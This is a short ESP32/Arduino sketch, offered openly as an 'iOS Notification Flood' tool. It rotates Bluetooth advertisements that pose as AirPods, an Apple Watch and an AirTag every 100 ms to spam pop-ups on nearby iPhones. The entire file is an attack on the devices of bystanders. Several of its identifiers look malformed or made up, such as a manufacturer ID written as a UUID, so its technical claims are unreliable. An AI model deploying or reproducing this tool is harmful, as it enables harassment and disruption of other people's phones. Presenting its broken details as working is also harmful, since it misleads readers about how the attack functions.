/**
 * iOS Notification Flood via BLE Advertisements
 * 
 * Transmits BLE advertisements with UUIDs that trigger iOS notifications
 * for new device connections (AirPods, Apple Watch, AirTag, etc.)
 */

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEAdvertising.h>

// Device UUIDs to simulate
#define AIRPODS_UUID "E0B9A5D8-F67C-4F2E-A3B1-D4E5F6A7B8C9"
#define APPLE_WATCH_UUID "A495BB20-C5B1-4B44-B512-1370F6AE8C4D"
#define AIRTAG_UUID "0x004C0002"

// Advertisement interval (ms)
#define ADV_INTERVAL 100

BLEAdvertising *pAdvertising;

void setup() {
    Serial.begin(115200);
    Serial.println("Starting iOS BLE Notification Flood...");
    
    // Initialize BLE
    BLEDevice::init("");
    
    // Create advertising object
    pAdvertising = BLEDevice::getAdvertising();
}

void loop() {
    // Cycle through different device types
    static int deviceIndex = 0;
    const char* uuids[] = {AIRPODS_UUID, APPLE_WATCH_UUID, AIRTAG_UUID};
    
    // Set advertisement data with current device UUID
    BLEAdvertisementData advData;
    advData.setFlags(0x06); // Discoverable and connectable
    
    // Add service UUID to trigger iOS notification
    BLEUUID serviceUuid(uuids[deviceIndex]);
    advData.addServiceUUID(serviceUuid);
    
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    
    Serial.printf("Advertising as: %s\n", uuids[deviceIndex]);
    
    // Wait for advertisement interval
    delay(ADV_INTERVAL);
    
    // Stop and restart with next device type
    pAdvertising->stop();
    deviceIndex = (deviceIndex + 1) % 3;
}
